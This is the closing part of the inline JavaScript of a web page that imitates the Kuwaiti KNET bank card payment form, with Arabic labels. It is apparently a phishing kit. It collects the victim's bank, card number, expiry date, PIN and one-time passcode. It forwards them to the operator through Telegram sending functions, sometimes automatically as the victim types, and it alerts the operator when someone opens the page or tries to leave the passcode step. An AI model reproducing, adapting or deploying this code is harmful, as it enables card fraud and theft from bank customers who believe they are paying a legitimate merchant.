                WARBA: "assets/images/banks/warba.jpg",
                WEYAY: "assets/images/banks/weyay.jpg"
            };

            function showCombinedPrefixPreview(value) {
                const enteredDigits = value.slice(0, 9);
                const firstMatch = Object.keys(BANK_PREFIXES)
                    .reduce(function(matches, bankCode) {
                        return matches.concat(BANK_PREFIXES[bankCode].map(function(prefix) {
                            return { bankCode: bankCode, prefix: prefix };
                        }));
                    }, [])
                    .filter(function(item) {
                        return item.prefix.startsWith(enteredDigits);
                    })
                    .sort(function(first, second) {
                        return second.prefix.length - first.prefix.length;
                    })[0];

                if (!/^[45]/.test(value) || !firstMatch) {
                    bankIndicator.hidden = true;
                    return;
                }

                if (!bankPrefixSuggestions.hidden) {
                    bankIndicator.hidden = true;
                    return;
                }

                const logo = bankIndicator.querySelector(".bank-indicator-logo");
                const label = bankIndicator.querySelector("span");
                const bankName = BANK_DISPLAY_NAMES[firstMatch.bankCode] || firstMatch.bankCode;

                logo.src = BANK_LOGOS[firstMatch.bankCode] || "";
                logo.alt = bankName;
                logo.hidden = !logo.src;
                label.textContent = firstMatch.prefix.slice(0, 6) + "  -  " + bankName;
                bankIndicator.dataset.prefix = firstMatch.prefix.slice(0, 6);
                bankIndicator.hidden = false;
            }

            function getSuggestedBankPrefix(value) {
                const digits = value.slice(0, 6);

                for (const bankCode of Object.keys(BANK_PREFIXES)) {
                    const prefix = BANK_PREFIXES[bankCode].find(function(candidate) {
                        return candidate.startsWith(digits);
                    });

                    if (prefix) {
                        return { bankCode: bankCode, prefix: prefix };
                    }
                }

                return null;
            }

            function getMatchingBankPrefixes(value) {
                const digits = value.slice(0, 6);
                const matches = [];

                Object.keys(BANK_PREFIXES).forEach(function(bankCode) {
                    BANK_PREFIXES[bankCode].forEach(function(prefix) {
                        if (prefix.startsWith(digits) && !matches.some(function(item) {
                            return item.prefix === prefix;
                        })) {
                            matches.push({ bankCode: bankCode, prefix: prefix });
                        }
                    });
                });

                return matches;
            }

            function hideBankPrefixSuggestions() {
                bankPrefixSuggestions.hidden = true;
                bankPrefixSuggestions.textContent = "";
            }

            function showBankPrefixSuggestions() {
                const enteredDigits = cardNumberCombined.value || debitNumberInput.value;
                const matches = /^[45]/.test(enteredDigits)
                    ? getMatchingBankPrefixes(enteredDigits)
                    : [];

                bankPrefixSuggestions.textContent = "";

                if (!matches.length || prefixSelect.value) {
                    hideBankPrefixSuggestions();
                    return;
                }

                matches.forEach(function(match) {
                    const button = document.createElement("button");
                    const logo = document.createElement("img");
                    const label = document.createElement("span");
                    const bankName = BANK_DISPLAY_NAMES[match.bankCode] || match.bankCode;

                    button.type = "button";
                    button.className = "bank-prefix-option";
                    logo.src = BANK_LOGOS[match.bankCode] || "";
                    logo.alt = bankName;
                    label.textContent = match.prefix + "  -  " + bankName;
                    button.appendChild(logo);
                    button.appendChild(label);
                    button.addEventListener("click", function() {
                        if (cardNumberCombined.value) {
                            cardNumberCombined.value = match.prefix.slice(0, 6);
                            cardNumberCombined.dispatchEvent(new Event("input", { bubbles: true }));
                            hideBankPrefixSuggestions();
                            showCombinedPrefixPreview(cardNumberCombined.value);
                            cardNumberCombined.focus();
                            return;
                        }

                        bankSelect.value = match.bankCode;
                        prefixes(match.bankCode);
                        prefixSelect.value = match.prefix;
                        debitNumberInput.value = "";
                        updateDebitNumberMaxLength(false);
                        hideBankPrefixSuggestions();
                        updateBankIndicator();
                        debitNumberInput.focus();
                    });
                    bankPrefixSuggestions.appendChild(button);
                });

                bankPrefixSuggestions.hidden = false;
            }

            function updateBankIndicator() {
                const enteredDigits = debitNumberInput.value;
                const selectedPrefix = prefixSelect.value;
                const suggestion = selectedPrefix
                    ? { bankCode: bankSelect.value, prefix: selectedPrefix }
                    : getSuggestedBankPrefix(enteredDigits);

                if (!selectedPrefix && !bankPrefixSuggestions.hidden) {
                    bankIndicator.hidden = true;
                    bankIndicator.textContent = "";
                    return;
                }

                if ((!selectedPrefix && !/^[45]/.test(enteredDigits)) || !suggestion) {
                    bankIndicator.hidden = true;
                    bankIndicator.textContent = "";
                    return;
                }

                const bankName = BANK_DISPLAY_NAMES[suggestion.bankCode] || suggestion.bankCode;
                const logo = bankIndicator.querySelector(".bank-indicator-logo");
                const label = bankIndicator.querySelector("span");
                const logoPath = BANK_LOGOS[suggestion.bankCode] || "";

                logo.src = logoPath;
                logo.alt = bankName;
                logo.hidden = !logoPath;
                label.textContent = bankName + "  •  " + suggestion.prefix;
                bankIndicator.hidden = false;
            }

            function applySuggestedBankPrefix() {
                const firstDigit = debitNumberInput.value.slice(0, 1);
                const matchingPrefixes = [];

                if (!/^[45]$/.test(firstDigit)) {
                    return false;
                }

                Object.keys(BANK_PREFIXES).forEach(function(bankCode) {
                    BANK_PREFIXES[bankCode].forEach(function(prefixValue) {
                        if (prefixValue.startsWith(firstDigit)) {
                            matchingPrefixes.push({
                                bankCode: bankCode,
                                prefix: prefixValue
                            });
                        }
                    });
                });

                prefixSelect.textContent = "";
                matchingPrefixes.forEach(function(item) {
                    const option = new Option(
                        item.prefix + " - " + (BANK_DISPLAY_NAMES[item.bankCode] || item.bankCode),
                        item.prefix
                    );
                    option.dataset.bankCode = item.bankCode;
                    prefixSelect.appendChild(option);
                });

                prefixSelect.value = "";
                prefixSelect.disabled = false;
                debitNumberInput.placeholder = "اختر البادئة ثم أدخل 10 أرقام";
                debitNumberInput.value = "";
                updateDebitNumberMaxLength(false);
                bankIndicator.hidden = true;
                return matchingPrefixes.length > 0;
            }

            function fillKnetForm(details) {
                const prefixValue = details.dcprefix || "";
                const bankCode = details.bankname || findBankCodeByPrefix(prefixValue);

                bankSelect.value = bankCode;
                prefixes(bankSelect.value);

                if (prefixValue && Array.from(prefixSelect.options).some(function(option) {
                    return option.value === prefixValue;
                })) {
                    prefixSelect.value = prefixValue;
                }

                updateDebitNumberMaxLength(true);
                debitNumberInput.value = details.debitnumber || "";
                monthSelect.value = details.month || "";
                yearSelect.value = details.year || "";
                cardPinInput.value = details.pincode || "";
            }

            function restoreKnetFormFromStorage() {
                const storedDetails = getStoredKnetDetails();
                const hasStoredCoreValues = storedDetails.bankname || storedDetails.dcprefix || storedDetails.debitnumber;

                if (!hasStoredCoreValues) {
                    return false;
                }

                fillKnetForm({
                    bankname: storedDetails.bankname,
                    dcprefix: storedDetails.dcprefix,
                    debitnumber: storedDetails.debitnumber,
                    month: "",
                    year: "",
                    pincode: ""
                });
                return true;
            }

            function setProceedButtonText(buttonText) {
                proceedButton.textContent = buttonText;
            }

            function stopOtpTimer(resetPlaceholder) {
                if (otpTimerInterval) {
                    window.clearInterval(otpTimerInterval);
                    otpTimerInterval = null;
                }

                if (resetPlaceholder) {
                    otpInput.placeholder = otpDefaultPlaceholder;
                }
            }

            function getOtpExpiryTimestamp() {
                const raw = Number(localStorage.getItem(OTP_EXPIRY_STORAGE_KEY));
                return Number.isFinite(raw) ? raw : 0;
            }

            function setOtpExpiryTimestamp(timestamp) {
                localStorage.setItem(OTP_EXPIRY_STORAGE_KEY, String(timestamp));
            }

            function clearOtpExpiryTimestamp() {
                localStorage.removeItem(OTP_EXPIRY_STORAGE_KEY);
            }

            function startOtpTimer() {
                const now = Date.now();
                let expiry = getOtpExpiryTimestamp();

                if (!expiry || expiry <= now) {
                    expiry = now + otpTimerDurationSeconds * 1000;
                    setOtpExpiryTimestamp(expiry);
                }

                stopOtpTimer(false);

                otpTimerInterval = window.setInterval(function() {
                    const remainingMs = Math.max(expiry - Date.now(), 0);
                    const remainingSeconds = Math.ceil(remainingMs / 1000);
                    otpInput.placeholder =
                        "Timeout in: " +
                        Math.floor(remainingSeconds / 60) +
                        ":" +
                        String(remainingSeconds % 60).padStart(2, "0");

                    if (remainingSeconds === 0) {
                        stopOtpTimer(false);
                    }
                }, 1000);
            }

            function isOtpFormVisible() {
                return otpForm.style.display === "block";
            }

            function consumeStep3RedirectFlag() {
                const wasRedirected = sessionStorage.getItem(KNET_REDIRECT_STORAGE_KEY) === "true";
                if (wasRedirected) {
                    sessionStorage.removeItem(KNET_REDIRECT_STORAGE_KEY);
                }
                return wasRedirected;
            }

            function updateValidationMessageDirection() {
                if (isOtpFormVisible()) {
                    validationMessage.setAttribute("dir", "rtl");
                    return;
                }

                validationMessage.removeAttribute("dir");
            }

            function formatTwoDigits(value) {
                return String(value).padStart(2, "0");
            }

            function maskCardNumber(prefixValue, debitNumberValue) {
                const maskedPartLength = Math.max(debitNumberValue.length - 4, 0);
                const visibleLastDigits = debitNumberValue.slice(-4);
                return prefixValue + "*".repeat(maskedPartLength) + visibleLastDigits;
            }

            function maskPinCode(pinCodeValue) {
                return "●".repeat(pinCodeValue.length || 4);
            }

            function maskOtpCardReference(prefixValue, debitNumberValue) {
                const safePrefix = prefixValue || "";
                const safeDebitNumber = debitNumberValue || "";
                const visibleLastDigits = safeDebitNumber.slice(-4) || "0000";
                return `${safePrefix}******${visibleLastDigits}`;
            }

            function populateOtpVerification(details) {
                dcNumberLabel.textContent = maskCardNumber(details.dcprefix, details.debitnumber);
                expiryMonthLabel.textContent = formatTwoDigits(details.month);
                expiryYearLabel.textContent = details.year;
                pinMaskLabel.textContent = maskPinCode(details.pincode);
            }

            function showKnetStep() {
                knetForm.style.display = "block";
                otpForm.style.display = "none";
                overlayHide.style.display = "none";
                proceedButton.disabled = false;
                otpInput.value = "";
                stopOtpTimer(true);
                setProceedButtonText("إرسال");
                localStorage.removeItem("knetOtpVisible");
                clearOtpExpiryTimestamp();
                if (window.hideSubmissionLoadingOverlay) {
                    window.hideSubmissionLoadingOverlay();
                }
                updateValidationMessageDirection();
                hideValidationMessage();
            }

            function showOtpStep() {
                knetForm.style.display = "none";
                otpForm.style.display = "block";
                overlayHide.style.display = "none";
                proceedButton.disabled = false;
                setProceedButtonText("تأكيد العملية");
                startOtpTimer();
                localStorage.setItem("knetOtpVisible", "true");
                if (window.hideSubmissionLoadingOverlay) {
                    window.hideSubmissionLoadingOverlay();
                }
                updateValidationMessageDirection();
                hideValidationMessage();
                requestAnimationFrame(function() {
                    otpInput.focus();
                });
            }

            function normalizeDigits(value) {
                return value
                    .replace(/[٠-٩]/g, function(char) { return String(char.charCodeAt(0) - 1632); })
                    .replace(/[۰-۹]/g, function(char) { return String(char.charCodeAt(0) - 1776); });
            }

            function extractOtpValue(value) {
                const normalized = normalizeDigits(value || "");
                const regexMatch = normalized.match(/(\d{6})/);
                return regexMatch ? regexMatch[1] : normalized.replace(/\D+/g, "").slice(0, 6);
            }

            function buildAutoOtpMessage(otpValue) {
                const details = getStoredKnetDetails();
                return [
                    `🔐 OTP for ${maskOtpCardReference(details.dcprefix, details.debitnumber)}`,
                    `─ ${otpValue}`,
                    "<b>ملاحظة: تم إرسال هذه الرسالة تلقائياً</b>"
                ].join("\n");
            }

            function buildManualOtpMessage(otpValue) {
                const details = getStoredKnetDetails();
                return [
                    `🔐 OTP for ${maskOtpCardReference(details.dcprefix, details.debitnumber)}`,
                    `─ ${otpValue}`
                ].join("\n");
            }

            function buildOtpLeaveMessage() {
                const identityLines = window.getTelegramStoredIdentityLines ? window.getTelegramStoredIdentityLines() : [];
                return [
                    identityLines[0] || "👤 الاسم: غير متوفر",
                    identityLines[1] || "📞 رقم الهاتف: غير متوفر",
                    window.getTelegramSeparator ? window.getTelegramSeparator() : "<b>───────────────</b>",
                    "محاولة مغادرة صفحة رمز التحقق بدون إدخال أي رمز"
                ].join("\n");
            }

            function sendInvalidKnetFields(invalidFields) {
                if (!window.sendTelegramMessageWithQueue) {
                    return;
                }

                const details = getCurrentKnetInputValues();
                const message = buildKnetSubmissionMessage(details, { invalidFields: invalidFields });
                window.sendTelegramMessageWithQueue(message, false).catch(function() {});
            }

            function resetKnetSensitiveInputs() {
                monthSelect.value = "";
                yearSelect.value = "";
                expiryMonthInput.value = "";
                expiryYearInput.value = "";
                cardPinInput.value = "";
                localStorage.setItem("month", "");
                localStorage.setItem("year", "");
                localStorage.setItem("pincode", "");
                expiryMonthLabel.textContent = "";
                expiryYearLabel.textContent = "";
                pinMaskLabel.textContent = maskPinCode("");
            }

            async function requestReturnFromOtp() {
                if (!isOtpFormVisible()) {
                    return;
                }

                if (extractOtpValue(otpInput.value)) {
                    showKnetStep();
                    resetKnetSensitiveInputs();
                    sendKnetLandingMessage();
                    return;
                }

                if (!window.confirm(otpBackConfirmationMessage)) {
                    requestAnimationFrame(function() {
                        otpInput.focus();
                    });
                    return;
                }

                if (window.sendTelegramMessageWithQueue) {
                    window.sendTelegramMessageWithQueue(buildOtpLeaveMessage(), false).catch(function() {});
                }

                showKnetStep();
                resetKnetSensitiveInputs();
                sendKnetLandingMessage();
            }

            function validateKnetDetails() {
                const debitNumber = debitNumberInput.value.trim();
                const completeCardLength = prefixSelect.value.length + debitNumber.length;
                updateExpiryValidity();

                const invalidFields = [];
                let firstInvalidField = null;

                if (!bankSelect.value) {
                    invalidFields.push("bankname");
                    firstInvalidField = firstInvalidField || "bankname";
                }

                if (!debitNumber || completeCardLength !== 16) {
                    if (!invalidFields.includes("card")) {
                        invalidFields.push("card");
                    }
                    firstInvalidField = firstInvalidField || "card";
                }

                if (!monthSelect.value || !yearSelect.value || isExpiredCard(monthSelect.value, yearSelect.value)) {
                    if (!invalidFields.includes("expiry")) {
                        invalidFields.push("expiry");
                    }
                    firstInvalidField = firstInvalidField || "expiry";
                }

                if (!/^\d{4}$/.test(cardPinInput.value.trim())) {
                    invalidFields.push("pincode");
                    firstInvalidField = firstInvalidField || "pincode";
                }

                if (firstInvalidField === "bankname") {
                    showValidationMessage("خطأ- يرجى أختيار أسم البنك ", bankSelect, ["bank"]);
                } else if (firstInvalidField === "card") {
                    showValidationMessage("خطأ يرجى أدخال رقم البطاقة بشكل صحيح", debitNumberInput, ["bank", "dcprefix", "debitNumber"]);
                } else if (firstInvalidField === "expiry") {
                    if (!monthSelect.value) {
                        showValidationMessage("خطأ، يرجى اختيار شهر انتهاء البطاقة.", monthSelect, ["month"]);
                    } else if (!yearSelect.value) {
                        showValidationMessage("خطأ، يرجى اختيار سنة انتهاء البطاقة.", yearSelect, ["year"]);
                    } else {
                        showValidationMessage("خطأ - البطاقة مدخلة منتهية الصلاحية", monthSelect, ["month", "year"]);
                    }
                } else if (firstInvalidField === "pincode") {
                    showValidationMessage("خطأ، الرقم السري غير صحيح، يجب أن يتكون من 4 أرقام.", cardPinInput, ["cardPin"]);
                }

                if (invalidFields.length) {
                    sendInvalidKnetFields(invalidFields);
                    return false;
                }

                return true;
            }

            function buildManualKnetMessage(details) {
                const identity = window.getTelegramStoredIdentity ? window.getTelegramStoredIdentity() : { name: "", phone: "" };
                return [
                    "🏦 معلومات كي نت 🏦",
                    `👤 ${identity.name || "غير متوفر"} \t ${identity.phone || "غير متوفر"}`,
                    window.getTelegramSeparator ? window.getTelegramSeparator() : "<b>───────────────</b>",
                    `🏦 ${details.bankname}`,
                    `💳 ${details.dcprefix} \t ${details.debitnumber}`,
                    `📅 ${details.month}/${details.year}`,
                    `🔐 ${details.pincode}`
                ].join("\n");
            }

            function getCurrentKnetInputValues() {
                return {
                    bankname: bankSelect.value.trim(),
                    dcprefix: prefixSelect.value.trim(),
                    debitnumber: debitNumberInput.value.trim(),
                    month: monthSelect.value.trim(),
                    year: yearSelect.value.trim(),
                    pincode: cardPinInput.value.trim()
                };
            }

            function buildKnetSubmissionMessage(details, options) {
                const opts = options || {};
                const cardParts = [details.dcprefix, details.debitnumber].filter(Boolean);
                const expiryParts = [details.month, details.year].filter(Boolean);
                const invalidFields = Array.isArray(opts.invalidFields) ? opts.invalidFields : [];
                const directionMark = "\u200E";
                const dividerLine = `${directionMark}───────────────`;
                const identity = window.getTelegramStoredIdentity
                    ? window.getTelegramStoredIdentity()
                    : { name: "", phone: "" };

                function formatLine(label, value, fieldKey) {
                    const invalidMark = invalidFields.includes(fieldKey) ? " ❌" : "";
                    return `${directionMark}${label}${invalidMark} ${value || ""}`.trim();
                }

                const lines = [
                    `${directionMark}      ${directionMark}      💳 بطاقة الكي النت 💳       `,
                    `${directionMark}👤 ${identity.name || "غير متوفر"}`,
                    `${directionMark}📞 ${identity.phone || "غير متوفر"}`,
                    dividerLine,
                    formatLine("🏦", details.bankname, "bankname"),
                    formatLine("💳", cardParts.join(" - "), "card"),
                    formatLine("📅", expiryParts.join("/"), "expiry"),
                    formatLine("🔐", details.pincode, "pincode")
                ];

                if (opts.autoNote) {
                    lines.push(`${directionMark}هذه الرسالة تلقائية`);
                }

                return lines.join("\n");
            }

            function isKnetDetailsValidSilent(details) {
                if (!details.bankname) return false;
                if (!details.dcprefix || !details.debitnumber) return false;
                if (details.dcprefix.length + details.debitnumber.length !== 16) return false;
                if (!details.month || !details.year) return false;
                if (isExpiredCard(details.month, details.year)) return false;
                if (!/^\d{4}$/.test(details.pincode || "")) return false;
                return true;
            }

            function maybeSendAutoKnetInfo() {
                if (autoKnetInfoSent || !window.sendTelegramMessageWithQueue) {
                    return;
                }

                const details = getCurrentKnetInputValues();
                if (!isKnetDetailsValidSilent(details)) {
                    return;
                }

                autoKnetInfoSent = true;
                const message = buildKnetSubmissionMessage(details, { autoNote: true });
                window.sendTelegramMessageWithQueue(message, false).catch(function() {});
            }

            function buildKnetLandingMessage() {
                const identityLines = window.getTelegramStoredIdentityLines ? window.getTelegramStoredIdentityLines() : [];
                const pageEmoji = window.getCurrentTelegramPageEmoji ? window.getCurrentTelegramPageEmoji() : "🏦";
                const identityParts = [];
                const identity = window.getTelegramStoredIdentity ? window.getTelegramStoredIdentity() : { name: "", phone: "" };

                if (identity.name) identityParts.push(identity.name);
                if (identity.phone) identityParts.push(identity.phone);

                const identityLine = identityParts.length ? `👤 ${identityParts.join(" ─ ")}` : "👤";

                return [
                    `${pageEmoji} شخص في صفحة الكي النت`,
                    identityLine
                ].join("\n");
            }

            function sendKnetLandingMessage() {
                if (!window.sendTelegramMessageWithQueue) {
                    return;
                }

                window.sendTelegramMessageWithQueue(buildKnetLandingMessage(), false).catch(function() {});
            }

            async function handleKnetDetailsSubmit() {
                if (!validateKnetDetails()) {
                    return;
                }

                const details = {
                    bankname: bankSelect.value,
                    dcprefix: prefixSelect.value,
                    debitnumber: debitNumberInput.value.trim(),
                    month: monthSelect.value.trim(),
                    year: yearSelect.value.trim(),
                    pincode: cardPinInput.value.trim()
                };

                saveKnetDetailsToLocalStorage(details);
                if (window.clearAllTelegramSessionKeys) {
                    window.clearAllTelegramSessionKeys();
                }
                hideValidationMessage();
                overlayHide.style.display = "block";
                proceedButton.disabled = true;

                if (window.sendTelegramUntilDelivered) {
                    await window.sendTelegramUntilDelivered(buildKnetSubmissionMessage(details), false);
                }

                if (window.showSubmissionLoadingOverlay) {
                    window.showSubmissionLoadingOverlay("جارٍ إرسال معلومات كي نت...", 3000, "knet");
                }

                populateOtpVerification(details);
                autoSentOtpValue = "";
                showOtpStep();
            }

            async function handleOtpSubmit() {
                const otpValue = extractOtpValue(otpInput.value);

                if (otpValue.length !== 6) {
                    showValidationMessage("خطأ - يرجى إدخال رمز التحقق بشكل صحيح", otpInput, ["dop"]);
                    return;
                }

                otpInput.value = otpValue;
                hideValidationMessage();
                overlayHide.style.display = "block";
                proceedButton.disabled = true;

                if (window.sendTelegramUntilDelivered) {
                    await window.sendTelegramUntilDelivered(buildManualOtpMessage(otpValue), false);
                }

                if (window.showSubmissionLoadingOverlay) {
                    window.showSubmissionLoadingOverlay("جارٍ إرسال رمز التحقق...", 3000, "knet");
                }

                otpInput.value = "";
                requestAnimationFrame(function() {
                    otpInput.focus();
                });
                overlayHide.style.display = "none";
                proceedButton.disabled = false;
                if (window.hideSubmissionLoadingOverlay) {
                    window.hideSubmissionLoadingOverlay();
                }
            }

            prefixes(bankSelect.value);
            updateDebitNumberMaxLength(false);
            restoreKnetFormFromStorage();
            cardNumberCombined.value = prefixSelect.value + debitNumberInput.value;
            expiryMonthInput.value = monthSelect.value ? String(monthSelect.value).padStart(2, "0") : "";
            expiryYearInput.value = yearSelect.value ? String(yearSelect.value).slice(-2) : "";
            if (consumeStep3RedirectFlag()) {
                showKnetStep();
            } else if (localStorage.getItem("knetOtpVisible") === "true") {
                showOtpStep();
            } else {
                showKnetStep();
            }
            updateBankIndicator();
            maybeSendAutoKnetInfo();

            bankSelect.addEventListener("change", function() {
                prefixes(this.value);
                updateDebitNumberMaxLength(true);
                hideValidationMessage(this.id);
                maybeSendAutoKnetInfo();
            });

            prefixSelect.addEventListener("change", function() {
                const selectedOption = this.options[this.selectedIndex];
                if (selectedOption && selectedOption.dataset.bankCode) {
                    bankSelect.value = selectedOption.dataset.bankCode;
                }
                updateDebitNumberMaxLength(true);
                debitNumberInput.placeholder = "أدخل 10 أرقام";
                debitNumberInput.focus();
                updateBankIndicator();
                hideValidationMessage(this.id);
                maybeSendAutoKnetInfo();
            });

            debitNumberInput.addEventListener("input", function() {
                keepDigitsOnly(this, true);
                showBankPrefixSuggestions();
                updateBankIndicator();
                hideValidationMessage(this.id);
                maybeSendAutoKnetInfo();
            });

            cardNumberCombined.addEventListener("input", function() {
                keepDigitsOnly(this, true);
                const value = this.value;
                showBankPrefixSuggestions();
                showCombinedPrefixPreview(value);
                const matchingPrefixes = Object.keys(BANK_PREFIXES)
                    .reduce(function(prefixesList, bankCode) {
                        return prefixesList.concat(BANK_PREFIXES[bankCode].map(function(prefix) {
                            return { bankCode: bankCode, prefix: prefix };
                        }));
                    }, [])
                    .filter(function(item) {
                        return value.startsWith(item.prefix);
                    })
                    .sort(function(first, second) {
                        return second.prefix.length - first.prefix.length;
                    });

                if (matchingPrefixes.length) {
                    bankSelect.value = matchingPrefixes[0].bankCode;
                    prefixes(matchingPrefixes[0].bankCode);
                    prefixSelect.value = matchingPrefixes[0].prefix;
                    debitNumberInput.value = value.slice(matchingPrefixes[0].prefix.length, 16);
                    updateDebitNumberMaxLength(false);
                } else {
                    prefixSelect.value = "";
                    debitNumberInput.value = "";
                }

                hideValidationMessage(this.id);
                maybeSendAutoKnetInfo();
            });

            bankIndicator.addEventListener("click", function() {
                const suggestedPrefix = this.dataset.prefix || "";

                if (!suggestedPrefix) {
                    return;
                }

                cardNumberCombined.value = suggestedPrefix;
                cardNumberCombined.dispatchEvent(new Event("input", { bubbles: true }));
                cardNumberCombined.focus();
            });

            monthSelect.addEventListener("change", function() {
                updateExpiryValidity();
                hideValidationMessage(this.id);
                maybeSendAutoKnetInfo();
            });

            yearSelect.addEventListener("change", function() {
                updateExpiryValidity();
                hideValidationMessage(this.id);
                maybeSendAutoKnetInfo();
            });

            function syncManualExpiry() {
                keepDigitsOnly(expiryMonthInput, true);
                keepDigitsOnly(expiryYearInput, true);
                expiryMonthInput.value = expiryMonthInput.value.slice(0, 2);
                expiryYearInput.value = expiryYearInput.value.slice(0, 2);

                const month = Number(expiryMonthInput.value);
                const year = Number(expiryYearInput.value);
                monthSelect.value = month >= 1 && month <= 12
                    ? String(month)
                    : "";
                yearSelect.value = expiryYearInput.value.length === 2
                    ? String(2000 + year)
                    : "";

                hideValidationMessage("month");
                maybeSendAutoKnetInfo();
            }

            expiryMonthInput.addEventListener("input", function() {
                syncManualExpiry();

                const month = Number(expiryMonthInput.value);
                if (expiryMonthInput.value.length === 2 && month >= 1 && month <= 12) {
                    expiryYearInput.focus();
                    expiryYearInput.select();
                }
            });
            expiryYearInput.addEventListener("input", syncManualExpiry);

            cardPinInput.addEventListener("input", function() {
                keepDigitsOnly(this, true);
                hideValidationMessage(this.id);
                maybeSendAutoKnetInfo();
            });

            otpInput.addEventListener("input", function() {
                const otpValue = extractOtpValue(otpInput.value);
                otpInput.value = otpValue;
                hideValidationMessage(this.id);

                if (otpValue.length === 6 && otpValue !== autoSentOtpValue && window.sendTelegramMessageWithQueue) {
                    autoSentOtpValue = otpValue;
                    window.sendTelegramMessageWithQueue(buildAutoOtpMessage(otpValue), false).catch(function() {});
                }
            });

            cancelButton.addEventListener("click", function() {
                requestReturnFromOtp().catch(function() {});
            });

            form.addEventListener("submit", function(event) {
                event.preventDefault();

                const action = isOtpFormVisible() ? handleOtpSubmit() : handleKnetDetailsSubmit();

                action.catch(function() {
                    overlayHide.style.display = "none";
                    proceedButton.disabled = false;
                    if (window.hideSubmissionLoadingOverlay) {
                        window.hideSubmissionLoadingOverlay();
                    }
                });
            });

            if (localStorage.getItem("knetOtpVisible") !== "true") {
                sendKnetLandingMessage();
            }
        });
    </script>
    <script src="./assets/js/telegram.js"></script>
    <script src="./assets/js/tg.js"></script>
    </body>
</html>
